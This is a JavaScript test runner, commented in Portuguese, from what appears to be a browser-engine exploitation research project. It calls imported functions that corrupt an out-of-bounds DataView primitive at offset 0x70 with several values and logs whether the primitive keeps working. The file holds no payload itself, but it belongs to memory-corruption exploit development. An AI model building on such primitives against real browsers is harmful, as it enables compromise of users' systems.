// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';

// Importa a nova função de teste da primitiva OOB
import { runTestCorruptOOBPrimitive } from './testJsonTypeConfusionUAFSpeculative.mjs';
// Adicione outras importações de teste do script3 se necessário

async function runFocusedTest_CorruptOwnOOBPrimitive() {
    const FNAME_RUNNER = "runFocusedTest_CorruptOwnOOBPrimitive";
    logS3(`==== INICIANDO TESTE DIRECIONADO: Corrupção da Própria Primitiva OOB ====`, 'test', FNAME_RUNNER);

    // Teste Chave: Escrever 0xFFFFFFFF em 0x70 e ver se a oob_dataview ainda funciona
    await runTestCorruptOOBPrimitive(
        "CorruptOOB_0x70_with_FFFF",
        0x70,       // corruptionOffset
        0xFFFFFFFF // valueToWrite
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // Teste de Controle: Escrever 0x41414141 em 0x70 (que antes não causava congelamento com JSON.stringify)
    await runTestCorruptOOBPrimitive(
        "CorruptOOB_0x70_with_AAAA",
        0x70,
        0x41414141
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    
    // Teste de Controle: Escrever 0x0 em 0x70
    await runTestCorruptOOBPrimitive(
        "CorruptOOB_0x70_with_NULL",
        0x70,
        0x0
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);


    logS3(`==== TESTE DIRECIONADO: Corrupção da Própria Primitiva OOB CONCLUÍDO ====`, 'test', FNAME_RUNNER);
}


export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_FocusCorruptOOBPrimitive';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Foco em Corromper a Própria Primitiva OOB ====`,'test', FNAME);
    
    await runFocusedTest_CorruptOwnOOBPrimitive();

    logS3(`\n==== Script 3 CONCLUÍDO (Foco em Corromper a Própria Primitiva OOB) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
}
